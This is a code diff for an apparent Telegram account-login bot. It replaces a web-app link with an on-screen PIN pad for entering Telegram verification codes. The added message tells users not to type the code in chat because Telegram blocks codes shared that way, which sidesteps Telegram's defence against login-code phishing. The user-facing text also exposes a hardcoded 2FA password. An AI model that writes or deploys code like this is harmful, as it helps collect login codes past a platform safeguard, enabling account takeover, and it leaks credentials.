@@ -13,7 +13,8 @@ import {
   buildAccountsKeyboard,
   buildDashboardBanner,
   buildMeshStatusBanner,
-  buildWalletsBanner
+  buildWalletsBanner,
+  buildPinPadKeyboard
 } from '../lib/ui.js';
 
 function normalizePhone(raw) {
@@ -290,14 +291,11 @@ Telegram dispatched an official 5-digit verification code to \`${cleanPhone}\`.
 
 ⚡ *Instant Auto-2FA:* Once code is verified, your 2FA password (\`Arif216@\`) will authenticate automatically in 0.5s!
 
-Please reply directly with the code (e.g. \`12345\`):`,
+⚠️ *DO NOT TYPE THE CODE AS TEXT IN CHAT!*
+Telegram automatically blocks any codes typed in chat messages as 'previously shared'.
+Tap the digits on the PIN Pad below:`,
           parse_mode: "Markdown",
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: "🔐 Submit via Secure WebApp ↗️", web_app: { url: "https://app8858823950.tgcloud.ai/" } }],
-              [{ text: "❌ Cancel", callback_data: "btn_cancel_login" }]
-            ]
-          }
+          reply_markup: buildPinPadKeyboard('', activeSession.accountIndex)
         });
       } else {
         await api.sendMessage({
